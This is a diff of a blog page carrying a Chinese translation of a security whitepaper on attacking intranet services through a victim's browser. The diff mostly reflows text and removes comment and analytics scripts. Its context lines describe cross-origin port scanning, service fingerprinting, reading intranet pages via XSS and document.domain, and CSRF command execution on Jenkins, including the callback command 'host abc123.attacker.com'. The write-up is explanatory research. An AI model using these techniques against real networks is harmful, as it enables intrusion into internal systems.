@@ -26,8 +26,9 @@
 在进行威胁建模时，开发者通常认为本地服务永远不会接收外部输入，因此通常缺乏对这些服务的安全审核。可能通过远程托管的恶意 JavaScript 攻击易受攻击的本地服务的最新示例是 Logitech Options 应用开启易受攻击的 WebSocket 服务器 [3]。通过远程跨域 JavaScript 进行的本地攻击代表了一种被低估的攻击面。
 同源策略不会阻止本地攻击吗？ 实际上，同源策略（SOP）[4]在很多情况下确实可以防范这种攻击，但正如我们看到的，仍然存在攻击可能成功的情况。尽管有相关文档，通常被忽略的事实是同源策略并不会阻止浏览器发出跨域请求，它只能阻止 JavaScript 读取响应。（同源策略允许嵌入跨域资源，如图像和 JavaScript，但这是另外一方面的内容。）对于攻击某些易受攻击的服务，它可能足以能够盲目地发送恶意请求以达到攻击者的目的。
 Mozilla 的文档很好地描述了同源策略的功能：允许跨域嵌入和写入，但不允许读取。允许跨域写入的事实使得可能执行以下攻击：
- 受害者在互联网上浏览恶意页面。页面上的 JavaScript 根据同源策略向不应与之通信的内部服务器发出异步请求(XMLHttpRequest)。 然而，浏览器将发送请求（此时服务器被利用）。 浏览器收到响应但不会将其传递给 JavaScript。  那跨域资源共享呢？ 我们要展示的攻击与跨域资源共享(CORS) [5] 无关，只与同源策略相关。在本白皮书中，我们可以假设不允许跨域资源共享请求，这意味着我们拥有最严格的设置，其中同源策略“阻止”所有内容。即使面对同源策略，我们也可以进行攻击。
-攻击概述 我们将看一下使用受害者的浏览器作为代理，外部站点上的 JavaScript 如何攻击运行在 localhost 或内网中的易受攻击的服务的示例。作为概述，我们将看看以下步骤：" />
+受害者在互联网上浏览恶意页面。页面上的 JavaScript 根据同源策略向不应与之通信的内部服务器发出异步请求(XMLHttpRequest)。 然而，浏览器将发送请求（此时服务器被利用）。 浏览器收到响应但不会将其传递给 JavaScript。 那跨域资源共享呢？ 我们要展示的攻击与跨域资源共享(CORS) [5] 无关，只与同源策略相关。在本白皮书中，我们可以假设不允许跨域资源共享请求，这意味着我们拥有最严格的设置，其中同源策略“阻止”所有内容。即使面对同源策略，我们也可以进行攻击。
+攻击概述 我们将看一下使用受害者的浏览器作为代理，外部站点上的 JavaScript 如何攻击运行在 localhost 或内网中的易受攻击的服务的示例。作为概述，我们将看看以下步骤：
+" />
 
   
   
@@ -45,8 +46,9 @@ Mozilla 的文档很好地描述了同源策略的功能：允许跨域嵌入和
 在进行威胁建模时，开发者通常认为本地服务永远不会接收外部输入，因此通常缺乏对这些服务的安全审核。可能通过远程托管的恶意 JavaScript 攻击易受攻击的本地服务的最新示例是 Logitech Options 应用开启易受攻击的 WebSocket 服务器 [3]。通过远程跨域 JavaScript 进行的本地攻击代表了一种被低估的攻击面。
 同源策略不会阻止本地攻击吗？ 实际上，同源策略（SOP）[4]在很多情况下确实可以防范这种攻击，但正如我们看到的，仍然存在攻击可能成功的情况。尽管有相关文档，通常被忽略的事实是同源策略并不会阻止浏览器发出跨域请求，它只能阻止 JavaScript 读取响应。（同源策略允许嵌入跨域资源，如图像和 JavaScript，但这是另外一方面的内容。）对于攻击某些易受攻击的服务，它可能足以能够盲目地发送恶意请求以达到攻击者的目的。
 Mozilla 的文档很好地描述了同源策略的功能：允许跨域嵌入和写入，但不允许读取。允许跨域写入的事实使得可能执行以下攻击：
- 受害者在互联网上浏览恶意页面。页面上的 JavaScript 根据同源策略向不应与之通信的内部服务器发出异步请求(XMLHttpRequest)。 然而，浏览器将发送请求（此时服务器被利用）。 浏览器收到响应但不会将其传递给 JavaScript。  那跨域资源共享呢？ 我们要展示的攻击与跨域资源共享(CORS) [5] 无关，只与同源策略相关。在本白皮书中，我们可以假设不允许跨域资源共享请求，这意味着我们拥有最严格的设置，其中同源策略“阻止”所有内容。即使面对同源策略，我们也可以进行攻击。
-攻击概述 我们将看一下使用受害者的浏览器作为代理，外部站点上的 JavaScript 如何攻击运行在 localhost 或内网中的易受攻击的服务的示例。作为概述，我们将看看以下步骤：" />
+受害者在互联网上浏览恶意页面。页面上的 JavaScript 根据同源策略向不应与之通信的内部服务器发出异步请求(XMLHttpRequest)。 然而，浏览器将发送请求（此时服务器被利用）。 浏览器收到响应但不会将其传递给 JavaScript。 那跨域资源共享呢？ 我们要展示的攻击与跨域资源共享(CORS) [5] 无关，只与同源策略相关。在本白皮书中，我们可以假设不允许跨域资源共享请求，这意味着我们拥有最严格的设置，其中同源策略“阻止”所有内容。即使面对同源策略，我们也可以进行攻击。
+攻击概述 我们将看一下使用受害者的浏览器作为代理，外部站点上的 JavaScript 如何攻击运行在 localhost 或内网中的易受攻击的服务的示例。作为概述，我们将看看以下步骤：
+" />
   <meta property="og:url" content="https://madneal.com/post/%E4%BD%BF%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BD%9C%E4%B8%BA%E4%BB%A3%E7%90%86%E4%BB%8E%E5%85%AC%E7%BD%91%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91/" />
   <meta property="og:image" content="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg" />
 
@@ -382,8 +384,7 @@ Mozilla 的文档很好地描述了同源策略的功能：允许跨域嵌入和
 <p>targetorg.com 域存在于我们的实验室网络中，通过受害者的浏览器使用目标的内部 DNS 服务器来完成对于这些名称的 DNS 查询。对于攻击其他组织，我们可以将 “targetorg.com” 替换为合适的域名，否则我们可以尝试例如 &lsquo;printer&rsquo;，没有任何域名，让受害者的 DNS 解析器自动添加正确的域名。</p>
 <p>我们可以轻松地修改概念验证（PoC）以将结果发回给我们（不展示此代码），我们可以对结果进行一些分析。我们现在知道主机 wiki.targetorg.com 不太有用，因为它的 HTTP 端口已关闭或主机不存在。 标记为开放的端口可能很有趣，因此我们可以对于这些端口做指纹识别，引导我们进入下一阶段的攻击&hellip;&hellip;</p>
 <blockquote>
-<p>注意：值得一提的资源是 LocalNetworkScanner 项目。它获取本地 IP 地址，然后通过端口扫描本地以及周围的 C 段的地址。该项目的源代码在 Github [17] 上，还有一个实时版本 [18]。对于某些浏览器，它可以正确地找到许多内部主机，但是不同的浏览器会有所不同。</p>
-</blockquote>
+<p>注意：值得一提的资源是 LocalNetworkScanner 项目。它获取本地 IP 地址，然后通过端口扫描本地以及周围的 C 段的地址。该项目的源代码在 Github [17] 上，还有一个实时版本 [18]。对于某些浏览器，它可以正确地找到许多内部主机，但是不同的浏览器会有所不同。</p></blockquote>
 <h3 id="使用默认文件查找在开放端口上运行的服务">使用默认文件查找在开放端口上运行的服务</h3>
 <p>此时我们有一个稍微缩减的（可能）开放端口列表，因为我们能够从我们一开始猜测的主机/端口列表中删除一部分。我们的下一步是找出在这些端口上运行的服务。</p>
 <p>同源策略让我们再一次变得盲目，但是找出端口后面运行的服务可以通过使用类似于我们进行端口扫描的技术来完成。一个额外的区别将是尝试找到特定的图像文件。如果 onload 事件触发，我们知道服务器上存在特定的图片文件（尽管我们的 JavaScript 无法访问它）。相反，如果触发了 onerror 事件，则所寻找的图像不存在。因此，即使由于同源策略 JavaScript 无法读取页面，它仍然可以确定差异。</p>
@@ -426,12 +427,10 @@ scan(resultElem,hostport,&#39;jenkins&#39;,&#39;/images/jenkins.png&#39;);
 <p><strong>图例 3</strong>: 本地以及本地局域网上服务的指纹</p>
 <p>再一次，结果将被发送给攻击者。主机 printer.targetorg.com 和 192.168.1.102 可能是同一台主机，因为根据指纹识别它们似乎都是 Lexmark 打印机。intranet.targetorg.com 和 192.168.1.100 可能也是同一个主机。</p>
 <blockquote>
-<p>注意：成功的服务指纹识别是端口确实开放的最终验证。对于端口 127.0.0.1:80，我们仍然不确定端口是否已关闭，或者它是否已打开但服务指纹识别失败。对于主机 192.168.1.103，我们仍然不确定它是否存在。对于指纹识别成功的端口，我们非常确信端口确实是开放的，我们知道它们运行在端口上的服务。</p>
-</blockquote>
+<p>注意：成功的服务指纹识别是端口确实开放的最终验证。对于端口 127.0.0.1:80，我们仍然不确定端口是否已关闭，或者它是否已打开但服务指纹识别失败。对于主机 192.168.1.103，我们仍然不确定它是否存在。对于指纹识别成功的端口，我们非常确信端口确实是开放的，我们知道它们运行在端口上的服务。</p></blockquote>
 <p>现在，让我们退后一步，看看到目前为止我们获取了那些。面对同源策略，我们已经成功从公网通过指纹识别出内网上九台主机上运行的服务，包括 localhost。这是我们攻击侦察部分的总结。</p>
 <blockquote>
-<p>注意：出于教学目的，我们在执行侦察时使用了多个恶意网页。在实践中，真正的攻击者可能准备一个能在页面中执行所有这些步骤的恶意网页，只需要受害者单击即可。</p>
-</blockquote>
+<p>注意：出于教学目的，我们在执行侦察时使用了多个恶意网页。在实践中，真正的攻击者可能准备一个能在页面中执行所有这些步骤的恶意网页，只需要受害者单击即可。</p></blockquote>
 <h2 id="通过-xss-浏览内部网络并更改页面源origin">通过 XSS 浏览内部网络并更改页面源(origin)</h2>
 <p>到目前为止，我们已经讨论过同源策略如何只允许我们发送请求，而不能读取响应。作为一个绕过步骤，让我们看看一个边缘情况，即使在同源策略完全生效的情况下，我们也可以读取响应 - 也就是说，缺少跨域资源共享可以减少同源策略施加的限制。读取响应的能力基本上允许我们使用受害者的浏览器作为代理从外部浏览受害者的内部网络。</p>
 <p>同源策略不会阻止从同一个源的读取页面，并且页面可能会更改其自己的源，以便能够与子域 [21] 进行通信。例如，如果 <a href="http://targetorg.com">http://targetorg.com</a> 已配置为能够与 <a href="http://intranet.targetorg.com">http://intranet.targetorg.com</a> 通信，那么如果我们能够在 targetorg.com 上运行 JavaScript 代码，我们可以像攻击者一样。 <a href="http://targetorg.com">http://targetorg.com</a> 上的跨站脚本（XSS）漏洞可能允许这个场景。</p>
@@ -462,8 +461,7 @@ scan(resultElem,hostport,&#39;jenkins&#39;,&#39;/images/jenkins.png&#39;);
 <p><strong>图例 5</strong>: 通过公网服务器上的 JavaScript 浏览受害者的内网。</p>
 <p>图例 5 中的截图显示 JavaScript 确实可以访问内网的内容，而不仅仅是在 iframe中 显示它。因此，它也可以将其发送给攻击者。外部 iframe 可以在 targetorg.com 的同源内运行，并且可以访问来自 intranet.targetorg.com 的内部 iframe 的数据。 从本质上讲，这允许我们浏览受害者的内网，查看他们的内网网页。</p>
 <blockquote>
-<p>注意：攻击生效的条件之一是 targetorg.com 和 intranet.target.org 页面都定义了 &lsquo;document.domain = &ldquo;targetorg.com&rdquo;&rsquo;，就同源策略而言，它们位于相同源。</p>
-</blockquote>
+<p>注意：攻击生效的条件之一是 targetorg.com 和 intranet.target.org 页面都定义了 &lsquo;document.domain = &ldquo;targetorg.com&rdquo;&rsquo;，就同源策略而言，它们位于相同源。</p></blockquote>
 <p>另一种可能的攻击情形可能是受害者在 passwords.targetorg.com 上有一个密码服务器。然后，如果受害者在登录到密码服务器时浏览我们的恶意 HTML/JavaScript 页面，我们可能能够读取密码。</p>
 <h2 id="攻击本地运行的-jenkins">攻击本地运行的 Jenkins</h2>
 <p>在展示如何通过绕过步骤浏览 targetorg.com 的内网时，让我们回到通过公网攻击内网服务的任务中。</p>
@@ -483,13 +481,11 @@ println &#34;out&gt; $sout err&gt; $serr&#34;
 根据配置，访问脚本控制台可能需要也可能不需要身份验证。即使需要身份验证，我们仍然可以通过 CSRF 访问脚本控制台，只要用户当前登录到 Jenkins 即可。原因是浏览器会在我们的请求中添加任何身份验证 cookie（如果我们设置 &lsquo;request.withCredentials = true;&rsquo;） - 攻击者不需要知道它们。重要的是 Jenkins 是否配置了 CSRF 保护。</p>
 <p>通常，人们会尝试安全地配置对外开放的服务器，但往往忽视内部服务器的安全性。对于本地服务而言，这种疏忽通常更为明显，基于主机的防火墙（有缺陷的）阻止访问是有理由的。因此，很有可能找到没有进行安全配置的 Jenkins 实例。考虑到这一点，假设 Jenkins 实例未配置 CSRF 保护，让我们准备一次攻击。</p>
 <blockquote>
-<p>注意：我们不会发布任何 Jenkins 零日漏洞，我们利用的不安全配置是一个已知问题（在非默认配置中）[23]。我们本可以选择任何漏洞，但决定使用 Jenkins 作为说明性示例。</p>
-</blockquote>
+<p>注意：我们不会发布任何 Jenkins 零日漏洞，我们利用的不安全配置是一个已知问题（在非默认配置中）[23]。我们本可以选择任何漏洞，但决定使用 Jenkins 作为说明性示例。</p></blockquote>
 <h3 id="通过-dns-验证命令盲注技术">通过 DNS 验证命令盲注技术</h3>
 <p>简略起见，为了避免在受害者上遗留建立持久化连接的细节，让我们验证注入的命令是否实际运行。一个通常能否验证盲注情形中命令的执行情况的简单的方法是让受害者向攻击者控制的 DNS 服务器发出 DNS 请求。在我们的设置中，我们可以控制 attacker.com 域的 DNS 服务器。因此，让我们将以下命令注入 Jenkins 脚本控制台：<code>host abc123.attacker.com</code>。 通过查看 DNS 查询日志，我们可以简单地从目标网络外部的位置验证系统命令实际运行情况。</p>
 <blockquote>
-<p>注意：此验证不依赖于受害者能够直接访问 attacker.com 域的 DNS 服务器。相反，会发生这种情况：当受害者运行 JavaScript 时，Jenkins 将运行系统命令，这将导致 DNS 查询被发送到受害者的内部 DNS 服务器，后者将转发它，并最终发送给 attacker.com 域的权威 DNS 服务器。（基本上，阻止这种情况的唯一方法是完全阻止 DNS 查询，这是很难实现的。）</p>
-</blockquote>
+<p>注意：此验证不依赖于受害者能够直接访问 attacker.com 域的 DNS 服务器。相反，会发生这种情况：当受害者运行 JavaScript 时，Jenkins 将运行系统命令，这将导致 DNS 查询被发送到受害者的内部 DNS 服务器，后者将转发它，并最终发送给 attacker.com 域的权威 DNS 服务器。（基本上，阻止这种情况的唯一方法是完全阻止 DNS 查询，这是很难实现的。）</p></blockquote>
 <h3 id="执行攻击并进行验证">执行攻击并进行验证</h3>
 <p>我们攻击 Jenkins 的恶意 HTML/JavaScrip 会是这样：</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
@@ -515,8 +511,7 @@ println &#34;out&gt; $sout err&gt; $serr&#34;
 <!-- raw HTML omitted -->
 <p>看到这一条 DNS 记录证明我们的命令注入已经成功总受害者机器上执行！</p>
 <blockquote>
-<p>注意：在实践中，真正的攻击者可能宁愿执行一些命令来获取并运行一些代码，这些代码在受害者和攻击者之间建立命令和控制（C2）通道。 然而，就本白皮书而言，我们仅限于证明命令注入。</p>
-</blockquote>
+<p>注意：在实践中，真正的攻击者可能宁愿执行一些命令来获取并运行一些代码，这些代码在受害者和攻击者之间建立命令和控制（C2）通道。 然而，就本白皮书而言，我们仅限于证明命令注入。</p></blockquote>
 <h2 id="简要的攻击链分析">简要的攻击链分析</h2>
 <p>回过头从全局角度来看，我们发现我们能够在面对同源策略的情况下，在公网找到并攻击在内网上运行的易受攻击的服务。通过使用受害者的浏览器作为代理，我们能够在此过程中完全绕过企业防火墙和基于主机的防火墙。</p>
 <p>此外，此次攻击并没有利用代码中的漏洞。攻击的每一步都依赖于按预期工作的事情（除了我们在 Jenkins 中的故意配置问题导致它有 CSRF 漏洞）。这反过来意味着即使将防火墙，浏览器和 Jenkins 更新到最新版本将无法抵御攻击。（对我们的示例攻击的适当保护是对 Jenkins 进行更安全的设置。）</p>
@@ -626,31 +621,13 @@ println &#34;out&gt; $sout err&gt; $serr&#34;
       </ul>
       
       <p class="post-copyright">
-        © This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you wish to quote or reproduce.This post was published <strong>2128</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+        © This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you wish to quote or reproduce.This post was published <strong>2160</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
       </p>
     </footer>
     
-      <div id="disqus_thread"></div>
-<script type="application/javascript">
-    window.disqus_config = function () {
-    
-    
-    
-    };
-    (function() {
-        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
-            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
-            return;
-        }
-        var d = document, s = d.createElement('script'); s.async = true;
-        s.src = '//' + "nealecnu" + '.disqus.com/embed.js';
-        s.setAttribute('data-timestamp', +new Date());
-        (d.head || d.body).appendChild(s);
-    })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-      
+        
+          
+       
     
   </section>
   <footer class="site-footer">
@@ -684,20 +661,7 @@ println &#34;out&gt; $sout err&gt; $serr&#34;
 </script>
 
 <script src="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/js/bundle.js"></script>
-
-
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-104405154-2', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
-
+  
 
 
 
